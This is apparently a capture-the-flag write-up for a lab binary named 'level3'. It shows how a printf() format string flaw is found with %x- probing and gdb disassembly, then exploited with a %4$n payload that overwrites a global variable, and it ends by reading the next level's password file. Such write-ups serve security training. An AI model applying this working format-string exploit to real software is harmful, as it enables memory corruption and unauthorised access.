As we can see, there is a vulnerability in printf() function.
by passing %x-.

python -c 'print "%x-" * 10' | ./level3
we can see that %x- is at the 4th position so i use gdb to find the address that we want to corrupt

gdb level3
(gdb) disas v
	  0x080484da <+54>:	mov    0x804988c,%eax
      0x080484df <+59>:	cmp    $0x40,%eax

so our payload looks like this :
	cat <(python -c 'print "\x08\x04\x98\x8c"[::-1] + "a" * 60 + "%4$n"') - | ./level3

cd ../level4; cat .pass
